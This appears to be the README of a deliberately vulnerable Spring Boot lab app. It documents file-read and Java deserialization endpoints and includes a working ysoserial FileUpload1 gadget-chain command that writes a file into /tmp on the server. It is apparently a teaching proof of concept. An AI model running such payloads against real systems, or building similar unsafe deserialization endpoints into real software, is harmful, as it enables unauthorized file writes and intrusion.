* How to Run:
  - Run via `mvn spring-boot:run`

* Routes:
  - Read `blub.txt` file: Visit `/file-test?file=blub.txt`
  - Serialize:
    - Get a serialized `Book` object: Visit `/serialize?doUrlEncode=false`
    - Get a serialized `Book` object that is also URL encoded: Visit `/serialize?doUrlEncode=true`
  - Deserialize:
    - `GET`: Visit `GET /deserialize?b=<base64book_UrlEncoded>`
    - `POST`: Visit `POST /deserialize` and provide the `object-to-deserialize` in the body

* Exploiting a `Gadget Chain` (that still works as of August 2022!):
  - As a PoC, the `pom.xml` contains `commons-fileupload:1.3.1` and `commons-io:2.4`
  - Thus, we can use the `FileUpload1` gadget chain from `ysoserial`: `java -jar ysoserial.jar FileUpload1 'write;/tmp;HACKEEED' | base64`
  - We send this to our `Spring Boot` app, which will create a randomly named file (e.g. `/tmp/upload_1e2897d1_aac7_4210_8911_57cbb6ac37c0_00000000.tmp`) in `/tmp` with the content `HACKEEED`
